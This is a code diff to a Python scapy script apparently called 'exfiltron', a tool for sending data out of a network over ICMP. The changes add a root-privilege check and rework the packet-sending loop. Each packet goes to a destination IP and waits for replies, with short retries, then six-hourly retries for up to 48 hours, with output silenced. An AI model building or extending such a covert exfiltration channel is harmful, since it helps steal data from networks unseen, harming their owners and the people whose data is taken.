@@ -12,7 +12,9 @@ import argparse     # For parsing command line arguments
 import logging      # Get rid of that pesky scapy IPv6 warning
 import sys          # If unexpected results occur, stop usage (and call your doctor)
 import time         # For getting some sleep in between packets
+import os           # Make sure the user is root
 
+# Is scapy installed? Are you running python 2.7?
 try:
     logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
     from scapy.all import *  # Use the almighty scapy package
@@ -21,8 +23,16 @@ except ImportError:          # Raise an error if scapy is not installed
     print("Exiting...")
     sys.exit()
 
+# Make sure the user is running as root
+if(os.getuid() is not 0):
+    print("You are not running exfiltron as root. Raw packet creation " +
+            "requires root privileges.")
+    print("Exiting...")
+    sys.exit()
+
 RETRY = 3           # The number of times to resend an unanswered packet
 TIMEOUT = 2.5       # Timeout = 2.5*amount_of_time_to_wait_between_each_packet
+FIVE_SEC = 5
 SIX_HOURS = 21600   # Six hours in terms of seconds
 FOURTY_EIGHT_HOURS = 172800     # Fourty-eight hours in terms of seconds
 
@@ -92,22 +102,39 @@ def send(packets, amountOfTime, destIP):
     @return (NoneType) None
     """
 
+    # TODO: Make progress bar
+    # Send each packet in the list
     for packet in packets:
+
+        # first_offense allows us to resend the packet twice more before waiting
+        # 6 hours to retry
+        first_offense = 0
+
         for numRetries in range(0, FOURTY_EIGHT_HOURS/SIX_HOURS):
             response = sr1(packet, retry=RETRY, timeout=TIMEOUT*amountOfTime,
-                           filter="host " + destIP + " and icmp")
+                           filter="host " + destIP + " and icmp", verbose=False)
 
-        # If we don't see a response, try again in 6 hours
-        if(reponse is None or response[0].show() is None):
-            time.sleep(SIX_HOURS)
-        else:
-            break  # Continue on to the next packet
+            # Try twice more for a response if no response was found
+            while(first_offense < 2 and response is None):
 
-        # 48 hours without a response means it's time to quit
-        if(numRetries == (FOURTY_EIGHT_HOURS/SIX_HOURS)-1):
-            print("No server response has been seen in two days.")
-            print("Exiting..")
-            sys.exit()
+                # Wait for 5 seconds before sending the next one
+                time.sleep(FIVE_SEC)
+
+                response = sr1(packet, retry=RETRY, timeout=TIMEOUT*amountOfTime,
+                           filter="host " + destIP + " and icmp", verbose=False)
+                first_offense += 1
+
+            # If we don't see a response, try again in 6 hours
+            if(response is None):
+                time.sleep(SIX_HOURS)
+            else:
+                break  # Continue on to the next packet
+
+            # 48 hours without a response means it's time to quit
+            if(numRetries == (FOURTY_EIGHT_HOURS/SIX_HOURS)-1):
+                print("No server response has been seen in two days.")
+                print("Exiting..")
+                sys.exit()
 
         # Wait for the specified amount of time before sending another packet
         time.sleep(amountOfTime)
